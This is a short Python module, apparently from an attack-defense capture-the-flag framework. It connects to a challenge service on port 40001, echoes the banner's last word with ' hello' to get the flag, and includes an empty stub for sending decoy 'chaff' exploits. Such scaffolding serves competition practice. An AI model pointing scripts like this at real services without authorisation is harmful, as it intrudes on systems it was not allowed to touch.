#!/usr/bin/env python3

from Exploit import Exploit
import socket

# This is the port you want to run against
PORT = 40001

class StartsWith(Exploit):
    # Name your file <classname>.py or else the launcher won't work
    def __init__(self, ip, debug=False):
        super().__init__(ip, PORT, debug)

    def get_flag(self):
        # This is where you would write your own exploit code.
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as conn:
            conn.connect((self.ip, PORT))
            line = conn.recv(1024).decode().split()[-1].rstrip(".")
            conn.send((line + " hello").encode())
            flag = conn.recv(1024).decode()

        # Return the flag as a string.
        return flag

    def send_chaff(self):
        # This is where you would write a fake exploit that does not really
        # work, but looks real enough to cause them to waste time looking for
        # the real exploit.
        pass

    def dprint(self, text):
        super().dprint(text, name=__name__.split(".")[1])
